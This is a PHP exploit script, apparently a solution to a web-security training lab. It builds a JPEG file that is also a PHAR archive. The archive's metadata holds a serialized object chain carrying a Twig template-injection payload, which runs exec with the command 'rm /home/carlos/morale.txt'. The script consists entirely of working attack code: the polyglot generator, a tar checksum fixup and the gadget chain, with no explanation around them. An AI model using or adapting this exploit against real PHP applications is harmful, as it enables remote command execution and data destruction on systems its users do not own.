<?php


function generate_base_phar($o, $prefix){
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($o);
    $phar->stopBuffering();
    
    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

function generate_polyglot($phar, $jpeg){
    $phar = substr($phar, 6); // remove <?php dosent work with prefix
    $len = strlen($phar) + 2; // fixed 
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);

    // calc tar checksum
    $chksum = 0;
    for ($i=0; $i<512; $i++){
        $chksum += ord(substr($contents, $i, 1));
    }
    // embed checksum
    $oct = sprintf("%07o", $chksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
    return $contents;
}


// pop exploit class
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'carlos';
$object->template_file_path = $blog;


// config for jpg
$tempname = 'temp.tar.phar'; // make it tar
$jpeg = file_get_contents('in.jpg');
$outfile = 'out.jpg';
$payload = $object;
$prefix = '';

var_dump(serialize($object));


// make jpg
file_put_contents($outfile, generate_polyglot(generate_base_phar($payload, $prefix), $jpeg));
